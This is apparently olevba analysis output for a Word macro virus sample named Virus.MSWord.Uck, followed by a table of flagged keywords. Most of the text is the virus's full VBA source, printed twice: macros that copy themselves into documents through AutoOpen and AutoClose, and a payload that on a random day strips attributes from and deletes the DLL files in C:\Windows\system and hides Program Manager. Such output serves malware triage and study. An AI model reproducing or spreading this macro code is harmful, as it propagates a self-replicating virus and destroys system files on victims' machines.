olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Uck
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Uck - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose2.bas 
in file: Virus.MSWord.Uck - OLE stream: 'Macros/VBA/AutoClose2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'*************************************
'* ULTRAS CONSTRUCTION KIT FOR WORD  *
'*            Version 1.0b           *
'*************************************
Public Sub Main()
Dim uCkAo$
Dim uCkAc$
On Error Resume Next
uCkAo$ = WordBasic.[FileName$]() + ":AutoOpen"
uCkAc$ = "AutoClose"
WordBasic.MacroCopy uCkAo$, uCkAc$
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy uCkAo$, uCkAc$
WordBasic.FileSave
Payload
End Sub
Private Sub Payload()
Dim U
Dim Destroy$
Dim G
U = WordBasic.Int(Rnd() * 30) + 1
If WordBasic.Day(WordBasic.Now()) = U Then
WordBasic.MsgBox "ZL0BA by ULTRAS", ("UCK"), 16
Destroy$ = "C:\Windows\system\*.dll"
SetAttr Destroy$, 0
WordBasic.Kill Destroy$
End If
G = WordBasic.Int(Rnd() * 6) + 1
If WordBasic.Weekday(WordBasic.Now()) = G Then
WordBasic.AppHide "Program Manager"
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose1.bas 
in file: Virus.MSWord.Uck - OLE stream: 'Macros/VBA/AutoClose1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'*************************************
'* ULTRAS CONSTRUCTION KIT FOR WORD  *
'*            Version 1.0b           *
'*************************************
Public Sub Main()
Dim uCkAo$
Dim uCkAc$
On Error Resume Next
uCkAo$ = WordBasic.[FileName$]() + ":AutoOpen"
uCkAc$ = "AutoClose"
WordBasic.MacroCopy uCkAo$, uCkAc$
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy uCkAo$, uCkAc$
WordBasic.FileSave
Payload
End Sub
Private Sub Payload()
Dim U
Dim Destroy$
Dim G
U = WordBasic.Int(Rnd() * 30) + 1
If WordBasic.Day(WordBasic.Now()) = U Then
WordBasic.MsgBox "ZL0BA by ULTRAS", ("UCK"), 16
Destroy$ = "C:\Windows\system\*.dll"
SetAttr Destroy$, 0
WordBasic.Kill Destroy$
End If
G = WordBasic.Int(Rnd() * 6) + 1
If WordBasic.Weekday(WordBasic.Now()) = G Then
WordBasic.AppHide "Program Manager"
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

